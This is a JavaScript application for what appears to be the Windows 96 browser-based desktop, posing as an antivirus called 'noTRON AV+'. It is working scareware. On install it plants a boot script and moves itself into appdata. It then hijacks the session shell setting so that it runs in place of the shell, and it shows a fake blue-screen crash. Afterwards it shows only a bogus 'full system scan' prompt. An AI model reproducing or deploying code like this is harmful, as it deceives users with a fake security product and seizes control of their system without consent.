//!wrt
const fs = w96.FS;
const { Theme } = w96.ui;
const { sysConf: SCM } = w96;

class GUIApplication extends WApplication {
    /**
     * Application constructor.
     */
    constructor() {
        super();
    }
    
    /**
     * Main entry point.
     * @param {String[]} argv The program arguments.
     */
    async main(argv) {
        super.main(argv);
        let a = await fs.exists("c:/user/appdata/z.wrt")
        if(a){
        const mainwnd = this.createWindow({
            title: "noTRON AV+",
            body: "Please preform a full system scan...<br><progress id='prog' value='0' max='100'></progress><br><button>Preform full system scan</button>",
            bodyClass: "sample-app",
            taskbar: false,
            resizable: false,
            initialHeight: 200,
            initialWidth: 250,
            icon: await Theme.getIconUrl("mime/executable", '16x16')
        }, true);
        mainwnd.show();
        } else {
            const mainwnd = this.createWindow({
            title: "noTRON AV+",
            body: "Installing noTRON AV+",
            bodyClass: "sample-app",
            taskbar: false,
            resizable: false,
            initialHeight: 100,
            initialWidth: 250,
            icon: await Theme.getIconUrl("mime/executable", '16x16')
        }, true);
        mainwnd.show();
            await fs.writestr("c:/system/boot/notron.js", 'const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("Software");');
            await fs.mvfile("c:/user/desktop/notronplus.wrt", "c:/user/appdata/z.wrt");
            SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
            await SCM.syncRoot("Software");
            w96.sys.renderBSOD("Failed to render window");
        }
    }
}

return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);
